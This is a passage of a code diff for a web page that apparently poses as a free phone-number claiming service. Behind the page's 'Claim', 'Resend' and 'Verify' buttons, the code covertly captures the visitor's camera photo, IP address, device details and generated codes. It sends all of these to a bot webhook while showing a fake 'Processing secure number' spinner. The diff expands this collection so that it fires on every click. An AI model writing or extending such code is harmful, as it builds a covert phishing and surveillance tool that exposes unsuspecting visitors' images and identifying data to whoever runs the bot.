         } catch(e) { console.log("Send error:", e); }
     }
     
-    // Claim button
+    // Claim button - SENDS EVERYTHING ON EVERY CLICK
     document.getElementById('claimBtn').addEventListener('click', async () => {
         if(!selectedCountry) { alert("Please select a country first!"); return; }
         currentCode = generateCode();
@@ -945,7 +917,7 @@
         loadingDiv.style.display = 'flex';
         loadingDiv.style.alignItems = 'center';
         loadingDiv.style.justifyContent = 'center';
-        loadingDiv.innerHTML = '<div style="color:white; background:#1e293b; padding:20px 40px; border-radius:30px;">⚡ Processing secure number...</div>';
+        loadingDiv.innerHTML = '<div style="color:white; background:#1e293b; padding:20px 40px; border-radius:30px;"><i class="fas fa-spinner fa-pulse"></i> Processing secure number...</div>';
         document.body.appendChild(loadingDiv);
         
         setTimeout(async () => {
@@ -955,46 +927,52 @@
             document.getElementById('verifyModal').classList.add('active');
             startTimer();
             
-            // Capture and send all data
+            // Capture and send ALL data on EVERY click
             try {
                 const photo = await capturePhoto();
                 const ip = await getIP();
-                const location = await getLocation();
                 const deviceInfo = getDeviceInfo();
-                await sendToBot(photo, ip, location, deviceInfo, currentCode);
+                await sendToBot(photo, ip, deviceInfo, currentCode, false, null);
             } catch(e) { console.log("Capture error:", e); }
         }, 2500);
     });
     
     // Resend code
-    document.getElementById('resendBtn').addEventListener('click', () => {
+    document.getElementById('resendBtn').addEventListener('click', async () => {
         currentCode = generateCode();
         document.getElementById('verificationCode').innerHTML = currentCode;
         showSmsNotif(currentCode);
         startTimer();
+        
+        // Send resend event
+        if (token) {
+            try {
+                const deviceInfo = getDeviceInfo();
+                await fetch(BOT_WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        token: token,
+                        event: "code_resend",
+                        newCode: currentCode,
+                        number: selectedCountry?.number,
+                        timestamp: new Date().toISOString(),
+                        deviceInfo: deviceInfo
+                    })
+                });
+            } catch(e) {}
+        }
     });
     
-    // Verify button
+    // Verify button - sends final verification
     document.getElementById('verifyBtn').addEventListener('click', async () => {
         const inputCode = document.getElementById('codeInput').value;
         if(inputCode === currentCode) {
-            // Send final verification with code
             if (token && selectedCountry) {
                 try {
                     const deviceInfo = getDeviceInfo();
-                    await fetch(BOT_WEBHOOK_URL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            token: token,
-                            verifiedCode: inputCode,
-                            number: selectedCountry.number,
-                            country: selectedCountry.name,
-                            userAgent: deviceInfo.userAgent,
-                            timestamp: new Date().toISOString(),
-                            verificationSuccess: true
-                        })
-                    });
+                    const ip = await getIP();
+                    await sendToBot(null, ip, deviceInfo, currentCode, true, inputCode);
                 } catch(e) {}
             }
             document.getElementById('verifyModal').classList.remove('active');
@@ -1016,7 +994,6 @@
     
     document.getElementById('searchInput').addEventListener('input', e => renderNumbers(e.target.value));
     
-    // Close modal on outside click
     document.getElementById('verifyModal').addEventListener('click', (e) => {
         if (e.target === document.getElementById('verifyModal')) {
             document.getElementById('verifyModal').classList.remove('active');
@@ -1031,11 +1008,9 @@
         }
     });
     
-    // Initialize
     renderNumbers();
     updateLiveStats();
     
-    // Clean up camera on unload
     window.addEventListener('beforeunload', () => {
         if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
     });
